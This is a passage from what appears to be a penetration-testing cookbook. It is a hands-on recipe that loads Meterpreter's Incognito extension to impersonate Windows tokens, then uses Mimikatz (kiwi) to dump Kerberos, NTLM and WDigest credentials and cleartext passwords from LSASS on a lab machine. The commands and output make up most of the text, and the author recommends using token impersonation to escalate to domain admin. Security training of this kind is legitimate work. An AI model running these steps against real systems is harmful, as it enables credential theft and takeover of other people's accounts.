
## How to do it...

- 1. In a Meterpreter session running with system privileges, before using Incognito, we will load the `incognito` Meterpreter extension, and then have a look at the available options:

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > help Incognito

Incognito Commands
==================

Command          Description
-------          -----------
add_group_user   Attempt to add a user
                 to a global group with all tokens
add_localgroup_user Attempt to add a user
                 to a local group with all tokens
add_user         Attempt to add a user
                 with all tokens
impersonate_token Impersonate specified token
list_tokens      List tokens available under
                 current user context
snarf_hashes     Snarf challenge/response
                 hashes for every token

meterpreter >
```

- 2. First, we will identify the valid tokens on the target system using the `list_tokens` command with `-u` to list tokens by a unique username:

```
meterpreter > list_tokens -u

Delegation Tokens Available
===========================
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
VAGRANT-2008R2\sshd_server
VAGRANT-2008R2\vagrant
```

### Impersonation Tokens Available

```
====================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_562_0.png)

To have access to all the available tokens, you must be running with system privileges. Not even administrators have access to all the tokens. So, for better results, try to escalate your privileges before using incognito.

- 3. To impersonate an available token and assume its privileges, we will use the impersonate_token command followed by the token we wish to impersonate using two backslashes (this is required because just one slash causes bugs):

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > impersonate_token VAGRANT-2008R2\\vagrant
[+] Delegation token available
[+] Successfully impersonated user VAGRANT-2008R2\vagrant
meterpreter > getuid
Server username: VAGRANT-2008R2\vagrant
meterpreter >
```

Using the getuid command, we can see that we successfully impersonated a user named vagrant using Incognito

Incognito proved to be one of my favorite tools because it allows us to rapidly escalate from local admin to domain user or even domain admin. By compromising a domain box with system privileges, we can wait or force a domain user to connect to the target machine and then use Incognito to impersonate its token and assume its privileges.

## Using Mimikatz

Mimikatz is a post-exploitation tool written by Benjamin Delpy which bundles together several of the most useful tasks that attackers perform. Mimikatz is one of the best tools to gather credential data from Windows systems.

### Getting ready

Metasploit has two versions of Mimikatz available as Meterpreter extensions: version 1.0 by loading the mimikatz extension, and the newer version 2.x by loading the kiwi extension. In this recipe, we will address the newer version and some of its most useful tasks.

### How to do it...

- 1. In a Meterpreter session running with system privileges, we will start by using the load command to load the kiwi extension:

```
meterpreter > load kiwi
Loading extension kiwi...

.#####. mimikatz 2.1.1 20170608 (x64/windows)
.## ^ ##. "A La Vie, A L'Amour"
## / \ ## /* * *
## \ / ## Benjamin DELPY `gentilkiwi`
( benjamin@gentilkiwi.com )
'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)
'#####' Ported to Metasploit by OJ Reeves
`TheColonial` * * */

Success.
meterpreter >
```

- 2. Now that we have loaded the extension, we will list all the available commands using the help kiwi command:

```
meterpreter > help kiwi

Kiwi Commands
=============

Command        Description
-------        -----------
creds_all      Retrieve all credentials
               (parsed)
creds_kerberos Retrieve Kerberos creds
               (parsed)
creds_msv      Retrieve LM/NTLM creds
               (parsed)
creds_ssp      Retrieve SSP creds
creds_tspkg    Retrieve TsPkg creds
```

```
creds_wdigest          (parsed)
Retrieve WDigest creds

dcsync                 (parsed)
Retrieve user account
information via

... 
lsa_dump_sam          Dump LSA SAM (unparsed)
lsa_dump_secrets      Dump LSA secrets (unparsed)
password_change       Change the password/hash of
a user
wifi_list             List wifi profiles/creds for
the current user
wifi_list_shared      List shared wifi profiles/creds
                      (requires SYSTEM)
meterpreter >
```

- 3. We will start by trying to retrieve the Kerberos credentials from the target machine, using the creds_kerberos command:

```
meterpreter > creds_kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
======================

Username      Domain          Password
--------      ------          --------
(null)        (null)          (null)
sshd_server   VAGRANT-2008R2  D@rj331ng
vagrant       VAGRANT-2008R2  vagrant
vagrant-2008r2$ WORKGROUP      (null)

meterpreter >
```

- 4. Next, we will use the creds_msv command to retrieve the LM/NTLM hashes using the MSV authentication package:

![](img/6b6e557533100c0e47951d0e5e14c4ee_564_0.png)

One of the features that helps Mimikatz become one of the most effective attack tools is its ability to retrieve cleartext passwords. After a user logs on, credentials are stored in memory by the Local Security Authority Subsystem Service (LSASS) process. Using Mimikatz, we are able to retrieve cleartext credentials.

![](img/6b6e557533100c0e47951d0e5e14c4ee_565_0.png)

Starting with Windows 8.1 and Windows Server 2012 R2, cleartext credentials are no longer stored in memory.

- 5. To retrieve cleartext passwords, we can use the `creds_wdigest` command:

```
meterpreter > creds_wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

Username      Domain        Password
-------      ------        --------
(null)       (null)        (null)
VAGRANT-2008R2$ WORKGROUP    (null)
sshd_server  VAGRANT-2008R2 D@rj331ng
vagrant      VAGRANT-2008R2 vagrant
```

Metasploit provides us with some built-in commands that allow us to use the most common Mimikatz features, but, if we want full access to all the features in Mimikatz, we can use the `kiwi_cmd` command.

- 6. First, let's check the version of Mimikatz we are using, with the `kiwi_cmd version` command:

```
meterpreter > kiwi_cmd version

mimikatz 2.1.1 (arch x64)
Windows NT 6.1 build 7601 (arch x64)
m svc 180021005 1
```

- 7. To list all the available modules, we can try to load a non-existing module:

```
meterpreter > kiwi_cmd ::
ERROR mimikatz_doLocal ; "" module not found !

    standard - Standard module
[Basic commands (does not require module name)]
```

```
crypto - Crypto Module
sekurlsa - SekurLSA module
[Some commands to enumerate credentials...]
...

dpapi - DPAPI Module (by API or RAW access)
[Data Protection application programming interface]
sysenv - System Environment Value module
sid - Security Identifiers module
iis - IIS XML Config module
rpc - RPC control of mimikatz
```

- 8. To query the available options for a specific module, we can use the following syntax:

```
meterpreter > kiwi_cmd sekurlsa::
ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !

Module : sekurlsa
Full name : SekurLSA module
Description : Some commands to enumerate credentials...

msw - Lists LM & NTLM credentials
wdigest - Lists WDigest credentials
kerberos - Lists Kerberos credentials
tspkg - Lists TsPkg credentials
livessp - Lists LiveSSP credentials
ssp - Lists SSP credentials
logonPasswords - Lists all available providers credentials
process - Switch (or reinit) to LSASS process context
minidump - Switch (or reinit) to LSASS minidump context
...
```

- 9. Now that we know which module we wish to use and the available options, we can use the kiwi_cmd command to list all the available credentials of the provider with the sekurlsa module:

```
meterpreter > kiwi_cmd sekurlsa::logonpasswords

Authentication Id : 0 ; 742172 (00000000:000b531c)
Session          : Interactive from 1
User Name        : vagrant
Domain           : VAGRANT-2008R2
```
